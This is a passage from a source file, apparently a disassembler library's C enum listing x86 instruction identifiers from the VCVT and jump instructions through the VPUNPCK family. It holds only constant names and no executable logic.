	X86_INS_VCVTSS2SD,
	X86_INS_VCVTTSD2SI,
	X86_INS_VCVTTSD2USI,
	X86_INS_VCVTTSS2SI,
	X86_INS_VCVTTSS2USI,
	X86_INS_VCVTUSI2SD,
	X86_INS_VCVTUSI2SS,
	X86_INS_VUCOMISD,
	X86_INS_VUCOMISS,
	X86_INS_JAE,
	X86_INS_JA,
	X86_INS_JBE,
	X86_INS_JB,
	X86_INS_JCXZ,
	X86_INS_JECXZ,
	X86_INS_JE,
	X86_INS_JGE,
	X86_INS_JG,
	X86_INS_JLE,
	X86_INS_JL,
	X86_INS_JMP,
	X86_INS_JNE,
	X86_INS_JNO,
	X86_INS_JNP,
	X86_INS_JNS,
	X86_INS_JO,
	X86_INS_JP,
	X86_INS_JRCXZ,
	X86_INS_JS,
	X86_INS_KANDB,
	X86_INS_KANDD,
	X86_INS_KANDNB,
	X86_INS_KANDND,
	X86_INS_KANDNQ,
	X86_INS_KANDNW,
	X86_INS_KANDQ,
	X86_INS_KANDW,
	X86_INS_KMOVB,
	X86_INS_KMOVD,
	X86_INS_KMOVQ,
	X86_INS_KMOVW,
	X86_INS_KNOTB,
	X86_INS_KNOTD,
	X86_INS_KNOTQ,
	X86_INS_KNOTW,
	X86_INS_KORB,
	X86_INS_KORD,
	X86_INS_KORQ,
	X86_INS_KORTESTW,
	X86_INS_KORW,
	X86_INS_KSHIFTLW,
	X86_INS_KSHIFTRW,
	X86_INS_KUNPCKBW,
	X86_INS_KXNORB,
	X86_INS_KXNORD,
	X86_INS_KXNORQ,
	X86_INS_KXNORW,
	X86_INS_KXORB,
	X86_INS_KXORD,
	X86_INS_KXORQ,
	X86_INS_KXORW,
	X86_INS_LAHF,
	X86_INS_LAR,
	X86_INS_LDDQU,
	X86_INS_LDMXCSR,
	X86_INS_LDS,
	X86_INS_FLDZ,
	X86_INS_FLD1,
	X86_INS_FLD,
	X86_INS_LEA,
	X86_INS_LEAVE,
	X86_INS_LES,
	X86_INS_LFENCE,
	X86_INS_LFS,
	X86_INS_LGDT,
	X86_INS_LGS,
	X86_INS_LIDT,
	X86_INS_LLDT,
	X86_INS_LMSW,
	X86_INS_OR,
	X86_INS_SUB,
	X86_INS_XOR,
	X86_INS_LODSB,
	X86_INS_LODSD,
	X86_INS_LODSQ,
	X86_INS_LODSW,
	X86_INS_LOOP,
	X86_INS_LOOPE,
	X86_INS_LOOPNE,
	X86_INS_RETF,
	X86_INS_RETFQ,
	X86_INS_LSL,
	X86_INS_LSS,
	X86_INS_LTR,
	X86_INS_XADD,
	X86_INS_LZCNT,
	X86_INS_MASKMOVDQU,
	X86_INS_MAXPD,
	X86_INS_MAXPS,
	X86_INS_MAXSD,
	X86_INS_MAXSS,
	X86_INS_MFENCE,
	X86_INS_MINPD,
	X86_INS_MINPS,
	X86_INS_MINSD,
	X86_INS_MINSS,
	X86_INS_CVTPD2PI,
	X86_INS_CVTPI2PD,
	X86_INS_CVTPI2PS,
	X86_INS_CVTPS2PI,
	X86_INS_CVTTPD2PI,
	X86_INS_CVTTPS2PI,
	X86_INS_EMMS,
	X86_INS_MASKMOVQ,
	X86_INS_MOVD,
	X86_INS_MOVDQ2Q,
	X86_INS_MOVNTQ,
	X86_INS_MOVQ2DQ,
	X86_INS_MOVQ,
	X86_INS_PABSB,
	X86_INS_PABSD,
	X86_INS_PABSW,
	X86_INS_PACKSSDW,
	X86_INS_PACKSSWB,
	X86_INS_PACKUSWB,
	X86_INS_PADDB,
	X86_INS_PADDD,
	X86_INS_PADDQ,
	X86_INS_PADDSB,
	X86_INS_PADDSW,
	X86_INS_PADDUSB,
	X86_INS_PADDUSW,
	X86_INS_PADDW,
	X86_INS_PALIGNR,
	X86_INS_PANDN,
	X86_INS_PAND,
	X86_INS_PAVGB,
	X86_INS_PAVGW,
	X86_INS_PCMPEQB,
	X86_INS_PCMPEQD,
	X86_INS_PCMPEQW,
	X86_INS_PCMPGTB,
	X86_INS_PCMPGTD,
	X86_INS_PCMPGTW,
	X86_INS_PEXTRW,
	X86_INS_PHADDSW,
	X86_INS_PHADDW,
	X86_INS_PHADDD,
	X86_INS_PHSUBD,
	X86_INS_PHSUBSW,
	X86_INS_PHSUBW,
	X86_INS_PINSRW,
	X86_INS_PMADDUBSW,
	X86_INS_PMADDWD,
	X86_INS_PMAXSW,
	X86_INS_PMAXUB,
	X86_INS_PMINSW,
	X86_INS_PMINUB,
	X86_INS_PMOVMSKB,
	X86_INS_PMULHRSW,
	X86_INS_PMULHUW,
	X86_INS_PMULHW,
	X86_INS_PMULLW,
	X86_INS_PMULUDQ,
	X86_INS_POR,
	X86_INS_PSADBW,
	X86_INS_PSHUFB,
	X86_INS_PSHUFW,
	X86_INS_PSIGNB,
	X86_INS_PSIGND,
	X86_INS_PSIGNW,
	X86_INS_PSLLD,
	X86_INS_PSLLQ,
	X86_INS_PSLLW,
	X86_INS_PSRAD,
	X86_INS_PSRAW,
	X86_INS_PSRLD,
	X86_INS_PSRLQ,
	X86_INS_PSRLW,
	X86_INS_PSUBB,
	X86_INS_PSUBD,
	X86_INS_PSUBQ,
	X86_INS_PSUBSB,
	X86_INS_PSUBSW,
	X86_INS_PSUBUSB,
	X86_INS_PSUBUSW,
	X86_INS_PSUBW,
	X86_INS_PUNPCKHBW,
	X86_INS_PUNPCKHDQ,
	X86_INS_PUNPCKHWD,
	X86_INS_PUNPCKLBW,
	X86_INS_PUNPCKLDQ,
	X86_INS_PUNPCKLWD,
	X86_INS_PXOR,
	X86_INS_MONITOR,
	X86_INS_MONTMUL,
	X86_INS_MOV,
	X86_INS_MOVABS,
	X86_INS_MOVBE,
	X86_INS_MOVDDUP,
	X86_INS_MOVDQA,
	X86_INS_MOVDQU,
	X86_INS_MOVHLPS,
	X86_INS_MOVHPD,
	X86_INS_MOVHPS,
	X86_INS_MOVLHPS,
	X86_INS_MOVLPD,
	X86_INS_MOVLPS,
	X86_INS_MOVMSKPD,
	X86_INS_MOVMSKPS,
	X86_INS_MOVNTDQA,
	X86_INS_MOVNTDQ,
	X86_INS_MOVNTI,
	X86_INS_MOVNTPD,
	X86_INS_MOVNTPS,
	X86_INS_MOVNTSD,
	X86_INS_MOVNTSS,
	X86_INS_MOVSB,
	X86_INS_MOVSD,
	X86_INS_MOVSHDUP,
	X86_INS_MOVSLDUP,
	X86_INS_MOVSQ,
	X86_INS_MOVSS,
	X86_INS_MOVSW,
	X86_INS_MOVSX,
	X86_INS_MOVSXD,
	X86_INS_MOVUPD,
	X86_INS_MOVUPS,
	X86_INS_MOVZX,
	X86_INS_MPSADBW,
	X86_INS_MUL,
	X86_INS_MULPD,
	X86_INS_MULPS,
	X86_INS_MULSD,
	X86_INS_MULSS,
	X86_INS_MULX,
	X86_INS_FMUL,
	X86_INS_FIMUL,
	X86_INS_FMULP,
	X86_INS_MWAIT,
	X86_INS_NEG,
	X86_INS_NOP,
	X86_INS_NOT,
	X86_INS_OUT,
	X86_INS_OUTSB,
	X86_INS_OUTSD,
	X86_INS_OUTSW,
	X86_INS_PACKUSDW,
	X86_INS_PAUSE,
	X86_INS_PAVGUSB,
	X86_INS_PBLENDVB,
	X86_INS_PBLENDW,
	X86_INS_PCLMULQDQ,
	X86_INS_PCMPEQQ,
	X86_INS_PCMPESTRI,
	X86_INS_PCMPESTRM,
	X86_INS_PCMPGTQ,
	X86_INS_PCMPISTRI,
	X86_INS_PCMPISTRM,
	X86_INS_PDEP,
	X86_INS_PEXT,
	X86_INS_PEXTRB,
	X86_INS_PEXTRD,
	X86_INS_PEXTRQ,
	X86_INS_PF2ID,
	X86_INS_PF2IW,
	X86_INS_PFACC,
	X86_INS_PFADD,
	X86_INS_PFCMPEQ,
	X86_INS_PFCMPGE,
	X86_INS_PFCMPGT,
	X86_INS_PFMAX,
	X86_INS_PFMIN,
	X86_INS_PFMUL,
	X86_INS_PFNACC,
	X86_INS_PFPNACC,
	X86_INS_PFRCPIT1,
	X86_INS_PFRCPIT2,
	X86_INS_PFRCP,
	X86_INS_PFRSQIT1,
	X86_INS_PFRSQRT,
	X86_INS_PFSUBR,
	X86_INS_PFSUB,
	X86_INS_PHMINPOSUW,
	X86_INS_PI2FD,
	X86_INS_PI2FW,
	X86_INS_PINSRB,
	X86_INS_PINSRD,
	X86_INS_PINSRQ,
	X86_INS_PMAXSB,
	X86_INS_PMAXSD,
	X86_INS_PMAXUD,
	X86_INS_PMAXUW,
	X86_INS_PMINSB,
	X86_INS_PMINSD,
	X86_INS_PMINUD,
	X86_INS_PMINUW,
	X86_INS_PMOVSXBD,
	X86_INS_PMOVSXBQ,
	X86_INS_PMOVSXBW,
	X86_INS_PMOVSXDQ,
	X86_INS_PMOVSXWD,
	X86_INS_PMOVSXWQ,
	X86_INS_PMOVZXBD,
	X86_INS_PMOVZXBQ,
	X86_INS_PMOVZXBW,
	X86_INS_PMOVZXDQ,
	X86_INS_PMOVZXWD,
	X86_INS_PMOVZXWQ,
	X86_INS_PMULDQ,
	X86_INS_PMULHRW,
	X86_INS_PMULLD,
	X86_INS_POP,
	X86_INS_POPAW,
	X86_INS_POPAL,
	X86_INS_POPCNT,
	X86_INS_POPF,
	X86_INS_POPFD,
	X86_INS_POPFQ,
	X86_INS_PREFETCH,
	X86_INS_PREFETCHNTA,
	X86_INS_PREFETCHT0,
	X86_INS_PREFETCHT1,
	X86_INS_PREFETCHT2,
	X86_INS_PREFETCHW,
	X86_INS_PSHUFD,
	X86_INS_PSHUFHW,
	X86_INS_PSHUFLW,
	X86_INS_PSLLDQ,
	X86_INS_PSRLDQ,
	X86_INS_PSWAPD,
	X86_INS_PTEST,
	X86_INS_PUNPCKHQDQ,
	X86_INS_PUNPCKLQDQ,
	X86_INS_PUSH,
	X86_INS_PUSHAW,
	X86_INS_PUSHAL,
	X86_INS_PUSHF,
	X86_INS_PUSHFD,
	X86_INS_PUSHFQ,
	X86_INS_RCL,
	X86_INS_RCPPS,
	X86_INS_RCPSS,
	X86_INS_RCR,
	X86_INS_RDFSBASE,
	X86_INS_RDGSBASE,
	X86_INS_RDMSR,
	X86_INS_RDPMC,
	X86_INS_RDRAND,
	X86_INS_RDSEED,
	X86_INS_RDTSC,
	X86_INS_RDTSCP,
	X86_INS_ROL,
	X86_INS_ROR,
	X86_INS_RORX,
	X86_INS_ROUNDPD,
	X86_INS_ROUNDPS,
	X86_INS_ROUNDSD,
	X86_INS_ROUNDSS,
	X86_INS_RSM,
	X86_INS_RSQRTPS,
	X86_INS_RSQRTSS,
	X86_INS_SAHF,
	X86_INS_SAL,
	X86_INS_SALC,
	X86_INS_SAR,
	X86_INS_SARX,
	X86_INS_SBB,
	X86_INS_SCASB,
	X86_INS_SCASD,
	X86_INS_SCASQ,
	X86_INS_SCASW,
	X86_INS_SETAE,
	X86_INS_SETA,
	X86_INS_SETBE,
	X86_INS_SETB,
	X86_INS_SETE,
	X86_INS_SETGE,
	X86_INS_SETG,
	X86_INS_SETLE,
	X86_INS_SETL,
	X86_INS_SETNE,
	X86_INS_SETNO,
	X86_INS_SETNP,
	X86_INS_SETNS,
	X86_INS_SETO,
	X86_INS_SETP,
	X86_INS_SETS,
	X86_INS_SFENCE,
	X86_INS_SGDT,
	X86_INS_SHA1MSG1,
	X86_INS_SHA1MSG2,
	X86_INS_SHA1NEXTE,
	X86_INS_SHA1RNDS4,
	X86_INS_SHA256MSG1,
	X86_INS_SHA256MSG2,
	X86_INS_SHA256RNDS2,
	X86_INS_SHL,
	X86_INS_SHLD,
	X86_INS_SHLX,
	X86_INS_SHR,
	X86_INS_SHRD,
	X86_INS_SHRX,
	X86_INS_SHUFPD,
	X86_INS_SHUFPS,
	X86_INS_SIDT,
	X86_INS_FSIN,
	X86_INS_SKINIT,
	X86_INS_SLDT,
	X86_INS_SMSW,
	X86_INS_SQRTPD,
	X86_INS_SQRTPS,
	X86_INS_SQRTSD,
	X86_INS_SQRTSS,
	X86_INS_FSQRT,
	X86_INS_STAC,
	X86_INS_STC,
	X86_INS_STD,
	X86_INS_STGI,
	X86_INS_STI,
	X86_INS_STMXCSR,
	X86_INS_STOSB,
	X86_INS_STOSD,
	X86_INS_STOSQ,
	X86_INS_STOSW,
	X86_INS_STR,
	X86_INS_FST,
	X86_INS_FSTP,
	X86_INS_FSTPNCE,
	X86_INS_SUBPD,
	X86_INS_SUBPS,
	X86_INS_FSUBR,
	X86_INS_FISUBR,
	X86_INS_FSUBRP,
	X86_INS_SUBSD,
	X86_INS_SUBSS,
	X86_INS_FSUB,
	X86_INS_FISUB,
	X86_INS_FSUBP,
	X86_INS_SWAPGS,
	X86_INS_SYSCALL,
	X86_INS_SYSENTER,
	X86_INS_SYSEXIT,
	X86_INS_SYSRET,
	X86_INS_T1MSKC,
	X86_INS_TEST,
	X86_INS_UD2,
	X86_INS_FTST,
	X86_INS_TZCNT,
	X86_INS_TZMSK,
	X86_INS_FUCOMPI,
	X86_INS_FUCOMI,
	X86_INS_FUCOMPP,
	X86_INS_FUCOMP,
	X86_INS_FUCOM,
	X86_INS_UD2B,
	X86_INS_UNPCKHPD,
	X86_INS_UNPCKHPS,
	X86_INS_UNPCKLPD,
	X86_INS_UNPCKLPS,
	X86_INS_VADDPD,
	X86_INS_VADDPS,
	X86_INS_VADDSD,
	X86_INS_VADDSS,
	X86_INS_VADDSUBPD,
	X86_INS_VADDSUBPS,
	X86_INS_VAESDECLAST,
	X86_INS_VAESDEC,
	X86_INS_VAESENCLAST,
	X86_INS_VAESENC,
	X86_INS_VAESIMC,
	X86_INS_VAESKEYGENASSIST,
	X86_INS_VALIGND,
	X86_INS_VALIGNQ,
	X86_INS_VANDNPD,
	X86_INS_VANDNPS,
	X86_INS_VANDPD,
	X86_INS_VANDPS,
	X86_INS_VBLENDMPD,
	X86_INS_VBLENDMPS,
	X86_INS_VBLENDPD,
	X86_INS_VBLENDPS,
	X86_INS_VBLENDVPD,
	X86_INS_VBLENDVPS,
	X86_INS_VBROADCASTF128,
	X86_INS_VBROADCASTI128,
	X86_INS_VBROADCASTI32X4,
	X86_INS_VBROADCASTI64X4,
	X86_INS_VBROADCASTSD,
	X86_INS_VBROADCASTSS,
	X86_INS_VCMPPD,
	X86_INS_VCMPPS,
	X86_INS_VCMPSD,
	X86_INS_VCMPSS,
	X86_INS_VCVTDQ2PD,
	X86_INS_VCVTDQ2PS,
	X86_INS_VCVTPD2DQX,
	X86_INS_VCVTPD2DQ,
	X86_INS_VCVTPD2PSX,
	X86_INS_VCVTPD2PS,
	X86_INS_VCVTPD2UDQ,
	X86_INS_VCVTPH2PS,
	X86_INS_VCVTPS2DQ,
	X86_INS_VCVTPS2PD,
	X86_INS_VCVTPS2PH,
	X86_INS_VCVTPS2UDQ,
	X86_INS_VCVTSD2SI,
	X86_INS_VCVTSD2USI,
	X86_INS_VCVTSS2SI,
	X86_INS_VCVTSS2USI,
	X86_INS_VCVTTPD2DQX,
	X86_INS_VCVTTPD2DQ,
	X86_INS_VCVTTPD2UDQ,
	X86_INS_VCVTTPS2DQ,
	X86_INS_VCVTTPS2UDQ,
	X86_INS_VCVTUDQ2PD,
	X86_INS_VCVTUDQ2PS,
	X86_INS_VDIVPD,
	X86_INS_VDIVPS,
	X86_INS_VDIVSD,
	X86_INS_VDIVSS,
	X86_INS_VDPPD,
	X86_INS_VDPPS,
	X86_INS_VERR,
	X86_INS_VERW,
	X86_INS_VEXTRACTF128,
	X86_INS_VEXTRACTF32X4,
	X86_INS_VEXTRACTF64X4,
	X86_INS_VEXTRACTI128,
	X86_INS_VEXTRACTI32X4,
	X86_INS_VEXTRACTI64X4,
	X86_INS_VEXTRACTPS,
	X86_INS_VFMADD132PD,
	X86_INS_VFMADD132PS,
	X86_INS_VFMADD213PD,
	X86_INS_VFMADD213PS,
	X86_INS_VFMADDPD,
	X86_INS_VFMADD231PD,
	X86_INS_VFMADDPS,
	X86_INS_VFMADD231PS,
	X86_INS_VFMADDSD,
	X86_INS_VFMADD213SD,
	X86_INS_VFMADD132SD,
	X86_INS_VFMADD231SD,
	X86_INS_VFMADDSS,
	X86_INS_VFMADD213SS,
	X86_INS_VFMADD132SS,
	X86_INS_VFMADD231SS,
	X86_INS_VFMADDSUB132PD,
	X86_INS_VFMADDSUB132PS,
	X86_INS_VFMADDSUB213PD,
	X86_INS_VFMADDSUB213PS,
	X86_INS_VFMADDSUBPD,
	X86_INS_VFMADDSUB231PD,
	X86_INS_VFMADDSUBPS,
	X86_INS_VFMADDSUB231PS,
	X86_INS_VFMSUB132PD,
	X86_INS_VFMSUB132PS,
	X86_INS_VFMSUB213PD,
	X86_INS_VFMSUB213PS,
	X86_INS_VFMSUBADD132PD,
	X86_INS_VFMSUBADD132PS,
	X86_INS_VFMSUBADD213PD,
	X86_INS_VFMSUBADD213PS,
	X86_INS_VFMSUBADDPD,
	X86_INS_VFMSUBADD231PD,
	X86_INS_VFMSUBADDPS,
	X86_INS_VFMSUBADD231PS,
	X86_INS_VFMSUBPD,
	X86_INS_VFMSUB231PD,
	X86_INS_VFMSUBPS,
	X86_INS_VFMSUB231PS,
	X86_INS_VFMSUBSD,
	X86_INS_VFMSUB213SD,
	X86_INS_VFMSUB132SD,
	X86_INS_VFMSUB231SD,
	X86_INS_VFMSUBSS,
	X86_INS_VFMSUB213SS,
	X86_INS_VFMSUB132SS,
	X86_INS_VFMSUB231SS,
	X86_INS_VFNMADD132PD,
	X86_INS_VFNMADD132PS,
	X86_INS_VFNMADD213PD,
	X86_INS_VFNMADD213PS,
	X86_INS_VFNMADDPD,
	X86_INS_VFNMADD231PD,
	X86_INS_VFNMADDPS,
	X86_INS_VFNMADD231PS,
	X86_INS_VFNMADDSD,
	X86_INS_VFNMADD213SD,
	X86_INS_VFNMADD132SD,
	X86_INS_VFNMADD231SD,
	X86_INS_VFNMADDSS,
	X86_INS_VFNMADD213SS,
	X86_INS_VFNMADD132SS,
	X86_INS_VFNMADD231SS,
	X86_INS_VFNMSUB132PD,
	X86_INS_VFNMSUB132PS,
	X86_INS_VFNMSUB213PD,
	X86_INS_VFNMSUB213PS,
	X86_INS_VFNMSUBPD,
	X86_INS_VFNMSUB231PD,
	X86_INS_VFNMSUBPS,
	X86_INS_VFNMSUB231PS,
	X86_INS_VFNMSUBSD,
	X86_INS_VFNMSUB213SD,
	X86_INS_VFNMSUB132SD,
	X86_INS_VFNMSUB231SD,
	X86_INS_VFNMSUBSS,
	X86_INS_VFNMSUB213SS,
	X86_INS_VFNMSUB132SS,
	X86_INS_VFNMSUB231SS,
	X86_INS_VFRCZPD,
	X86_INS_VFRCZPS,
	X86_INS_VFRCZSD,
	X86_INS_VFRCZSS,
	X86_INS_VORPD,
	X86_INS_VORPS,
	X86_INS_VXORPD,
	X86_INS_VXORPS,
	X86_INS_VGATHERDPD,
	X86_INS_VGATHERDPS,
	X86_INS_VGATHERPF0DPD,
	X86_INS_VGATHERPF0DPS,
	X86_INS_VGATHERPF0QPD,
	X86_INS_VGATHERPF0QPS,
	X86_INS_VGATHERPF1DPD,
	X86_INS_VGATHERPF1DPS,
	X86_INS_VGATHERPF1QPD,
	X86_INS_VGATHERPF1QPS,
	X86_INS_VGATHERQPD,
	X86_INS_VGATHERQPS,
	X86_INS_VHADDPD,
	X86_INS_VHADDPS,
	X86_INS_VHSUBPD,
	X86_INS_VHSUBPS,
	X86_INS_VINSERTF128,
	X86_INS_VINSERTF32X4,
	X86_INS_VINSERTF64X4,
	X86_INS_VINSERTI128,
	X86_INS_VINSERTI32X4,
	X86_INS_VINSERTI64X4,
	X86_INS_VINSERTPS,
	X86_INS_VLDDQU,
	X86_INS_VLDMXCSR,
	X86_INS_VMASKMOVDQU,
	X86_INS_VMASKMOVPD,
	X86_INS_VMASKMOVPS,
	X86_INS_VMAXPD,
	X86_INS_VMAXPS,
	X86_INS_VMAXSD,
	X86_INS_VMAXSS,
	X86_INS_VMCALL,
	X86_INS_VMCLEAR,
	X86_INS_VMFUNC,
	X86_INS_VMINPD,
	X86_INS_VMINPS,
	X86_INS_VMINSD,
	X86_INS_VMINSS,
	X86_INS_VMLAUNCH,
	X86_INS_VMLOAD,
	X86_INS_VMMCALL,
	X86_INS_VMOVQ,
	X86_INS_VMOVDDUP,
	X86_INS_VMOVD,
	X86_INS_VMOVDQA32,
	X86_INS_VMOVDQA64,
	X86_INS_VMOVDQA,
	X86_INS_VMOVDQU16,
	X86_INS_VMOVDQU32,
	X86_INS_VMOVDQU64,
	X86_INS_VMOVDQU8,
	X86_INS_VMOVDQU,
	X86_INS_VMOVHLPS,
	X86_INS_VMOVHPD,
	X86_INS_VMOVHPS,
	X86_INS_VMOVLHPS,
	X86_INS_VMOVLPD,
	X86_INS_VMOVLPS,
	X86_INS_VMOVMSKPD,
	X86_INS_VMOVMSKPS,
	X86_INS_VMOVNTDQA,
	X86_INS_VMOVNTDQ,
	X86_INS_VMOVNTPD,
	X86_INS_VMOVNTPS,
	X86_INS_VMOVSD,
	X86_INS_VMOVSHDUP,
	X86_INS_VMOVSLDUP,
	X86_INS_VMOVSS,
	X86_INS_VMOVUPD,
	X86_INS_VMOVUPS,
	X86_INS_VMPSADBW,
	X86_INS_VMPTRLD,
	X86_INS_VMPTRST,
	X86_INS_VMREAD,
	X86_INS_VMRESUME,
	X86_INS_VMRUN,
	X86_INS_VMSAVE,
	X86_INS_VMULPD,
	X86_INS_VMULPS,
	X86_INS_VMULSD,
	X86_INS_VMULSS,
	X86_INS_VMWRITE,
	X86_INS_VMXOFF,
	X86_INS_VMXON,
	X86_INS_VPABSB,
	X86_INS_VPABSD,
	X86_INS_VPABSQ,
	X86_INS_VPABSW,
	X86_INS_VPACKSSDW,
	X86_INS_VPACKSSWB,
	X86_INS_VPACKUSDW,
	X86_INS_VPACKUSWB,
	X86_INS_VPADDB,
	X86_INS_VPADDD,
	X86_INS_VPADDQ,
	X86_INS_VPADDSB,
	X86_INS_VPADDSW,
	X86_INS_VPADDUSB,
	X86_INS_VPADDUSW,
	X86_INS_VPADDW,
	X86_INS_VPALIGNR,
	X86_INS_VPANDD,
	X86_INS_VPANDND,
	X86_INS_VPANDNQ,
	X86_INS_VPANDN,
	X86_INS_VPANDQ,
	X86_INS_VPAND,
	X86_INS_VPAVGB,
	X86_INS_VPAVGW,
	X86_INS_VPBLENDD,
	X86_INS_VPBLENDMD,
	X86_INS_VPBLENDMQ,
	X86_INS_VPBLENDVB,
	X86_INS_VPBLENDW,
	X86_INS_VPBROADCASTB,
	X86_INS_VPBROADCASTD,
	X86_INS_VPBROADCASTMB2Q,
	X86_INS_VPBROADCASTMW2D,
	X86_INS_VPBROADCASTQ,
	X86_INS_VPBROADCASTW,
	X86_INS_VPCLMULQDQ,
	X86_INS_VPCMOV,
	X86_INS_VPCMP,
	X86_INS_VPCMPD,
	X86_INS_VPCMPEQB,
	X86_INS_VPCMPEQD,
	X86_INS_VPCMPEQQ,
	X86_INS_VPCMPEQW,
	X86_INS_VPCMPESTRI,
	X86_INS_VPCMPESTRM,
	X86_INS_VPCMPGTB,
	X86_INS_VPCMPGTD,
	X86_INS_VPCMPGTQ,
	X86_INS_VPCMPGTW,
	X86_INS_VPCMPISTRI,
	X86_INS_VPCMPISTRM,
	X86_INS_VPCMPQ,
	X86_INS_VPCMPUD,
	X86_INS_VPCMPUQ,
	X86_INS_VPCOMB,
	X86_INS_VPCOMD,
	X86_INS_VPCOMQ,
	X86_INS_VPCOMUB,
	X86_INS_VPCOMUD,
	X86_INS_VPCOMUQ,
	X86_INS_VPCOMUW,
	X86_INS_VPCOMW,
	X86_INS_VPCONFLICTD,
	X86_INS_VPCONFLICTQ,
	X86_INS_VPERM2F128,
	X86_INS_VPERM2I128,
	X86_INS_VPERMD,
	X86_INS_VPERMI2D,
	X86_INS_VPERMI2PD,
	X86_INS_VPERMI2PS,
	X86_INS_VPERMI2Q,
	X86_INS_VPERMIL2PD,
	X86_INS_VPERMIL2PS,
	X86_INS_VPERMILPD,
	X86_INS_VPERMILPS,
	X86_INS_VPERMPD,
	X86_INS_VPERMPS,
	X86_INS_VPERMQ,
	X86_INS_VPERMT2D,
	X86_INS_VPERMT2PD,
	X86_INS_VPERMT2PS,
	X86_INS_VPERMT2Q,
	X86_INS_VPEXTRB,
	X86_INS_VPEXTRD,
	X86_INS_VPEXTRQ,
	X86_INS_VPEXTRW,
	X86_INS_VPGATHERDD,
	X86_INS_VPGATHERDQ,
	X86_INS_VPGATHERQD,
	X86_INS_VPGATHERQQ,
	X86_INS_VPHADDBD,
	X86_INS_VPHADDBQ,
	X86_INS_VPHADDBW,
	X86_INS_VPHADDDQ,
	X86_INS_VPHADDD,
	X86_INS_VPHADDSW,
	X86_INS_VPHADDUBD,
	X86_INS_VPHADDUBQ,
	X86_INS_VPHADDUBW,
	X86_INS_VPHADDUDQ,
	X86_INS_VPHADDUWD,
	X86_INS_VPHADDUWQ,
	X86_INS_VPHADDWD,
	X86_INS_VPHADDWQ,
	X86_INS_VPHADDW,
	X86_INS_VPHMINPOSUW,
	X86_INS_VPHSUBBW,
	X86_INS_VPHSUBDQ,
	X86_INS_VPHSUBD,
	X86_INS_VPHSUBSW,
	X86_INS_VPHSUBWD,
	X86_INS_VPHSUBW,
	X86_INS_VPINSRB,
	X86_INS_VPINSRD,
	X86_INS_VPINSRQ,
	X86_INS_VPINSRW,
	X86_INS_VPLZCNTD,
	X86_INS_VPLZCNTQ,
	X86_INS_VPMACSDD,
	X86_INS_VPMACSDQH,
	X86_INS_VPMACSDQL,
	X86_INS_VPMACSSDD,
	X86_INS_VPMACSSDQH,
	X86_INS_VPMACSSDQL,
	X86_INS_VPMACSSWD,
	X86_INS_VPMACSSWW,
	X86_INS_VPMACSWD,
	X86_INS_VPMACSWW,
	X86_INS_VPMADCSSWD,
	X86_INS_VPMADCSWD,
	X86_INS_VPMADDUBSW,
	X86_INS_VPMADDWD,
	X86_INS_VPMASKMOVD,
	X86_INS_VPMASKMOVQ,
	X86_INS_VPMAXSB,
	X86_INS_VPMAXSD,
	X86_INS_VPMAXSQ,
	X86_INS_VPMAXSW,
	X86_INS_VPMAXUB,
	X86_INS_VPMAXUD,
	X86_INS_VPMAXUQ,
	X86_INS_VPMAXUW,
	X86_INS_VPMINSB,
	X86_INS_VPMINSD,
	X86_INS_VPMINSQ,
	X86_INS_VPMINSW,
	X86_INS_VPMINUB,
	X86_INS_VPMINUD,
	X86_INS_VPMINUQ,
	X86_INS_VPMINUW,
	X86_INS_VPMOVDB,
	X86_INS_VPMOVDW,
	X86_INS_VPMOVMSKB,
	X86_INS_VPMOVQB,
	X86_INS_VPMOVQD,
	X86_INS_VPMOVQW,
	X86_INS_VPMOVSDB,
	X86_INS_VPMOVSDW,
	X86_INS_VPMOVSQB,
	X86_INS_VPMOVSQD,
	X86_INS_VPMOVSQW,
	X86_INS_VPMOVSXBD,
	X86_INS_VPMOVSXBQ,
	X86_INS_VPMOVSXBW,
	X86_INS_VPMOVSXDQ,
	X86_INS_VPMOVSXWD,
	X86_INS_VPMOVSXWQ,
	X86_INS_VPMOVUSDB,
	X86_INS_VPMOVUSDW,
	X86_INS_VPMOVUSQB,
	X86_INS_VPMOVUSQD,
	X86_INS_VPMOVUSQW,
	X86_INS_VPMOVZXBD,
	X86_INS_VPMOVZXBQ,
	X86_INS_VPMOVZXBW,
	X86_INS_VPMOVZXDQ,
	X86_INS_VPMOVZXWD,
	X86_INS_VPMOVZXWQ,
	X86_INS_VPMULDQ,
	X86_INS_VPMULHRSW,
	X86_INS_VPMULHUW,
	X86_INS_VPMULHW,
	X86_INS_VPMULLD,
	X86_INS_VPMULLW,
	X86_INS_VPMULUDQ,
	X86_INS_VPORD,
	X86_INS_VPORQ,
	X86_INS_VPOR,
	X86_INS_VPPERM,
	X86_INS_VPROTB,
	X86_INS_VPROTD,
	X86_INS_VPROTQ,
	X86_INS_VPROTW,
	X86_INS_VPSADBW,
	X86_INS_VPSCATTERDD,
	X86_INS_VPSCATTERDQ,
	X86_INS_VPSCATTERQD,
	X86_INS_VPSCATTERQQ,
	X86_INS_VPSHAB,
	X86_INS_VPSHAD,
	X86_INS_VPSHAQ,
	X86_INS_VPSHAW,
	X86_INS_VPSHLB,
	X86_INS_VPSHLD,
	X86_INS_VPSHLQ,
	X86_INS_VPSHLW,
	X86_INS_VPSHUFB,
	X86_INS_VPSHUFD,
	X86_INS_VPSHUFHW,
	X86_INS_VPSHUFLW,
	X86_INS_VPSIGNB,
	X86_INS_VPSIGND,
	X86_INS_VPSIGNW,
	X86_INS_VPSLLDQ,
	X86_INS_VPSLLD,
	X86_INS_VPSLLQ,
	X86_INS_VPSLLVD,
	X86_INS_VPSLLVQ,
	X86_INS_VPSLLW,
	X86_INS_VPSRAD,
	X86_INS_VPSRAQ,
	X86_INS_VPSRAVD,
	X86_INS_VPSRAVQ,
	X86_INS_VPSRAW,
	X86_INS_VPSRLDQ,
	X86_INS_VPSRLD,
	X86_INS_VPSRLQ,
	X86_INS_VPSRLVD,
	X86_INS_VPSRLVQ,
	X86_INS_VPSRLW,
	X86_INS_VPSUBB,
	X86_INS_VPSUBD,
	X86_INS_VPSUBQ,
	X86_INS_VPSUBSB,
	X86_INS_VPSUBSW,
	X86_INS_VPSUBUSB,
	X86_INS_VPSUBUSW,
	X86_INS_VPSUBW,
	X86_INS_VPTESTMD,
	X86_INS_VPTESTMQ,
	X86_INS_VPTESTNMD,
	X86_INS_VPTESTNMQ,
	X86_INS_VPTEST,
	X86_INS_VPUNPCKHBW,
	X86_INS_VPUNPCKHDQ,
	X86_INS_VPUNPCKHQDQ,
	X86_INS_VPUNPCKHWD,
	X86_INS_VPUNPCKLBW,
	X86_INS_VPUNPCKLDQ,
	X86_INS_VPUNPCKLQDQ,
	X86_INS_VPUNPCKLWD,
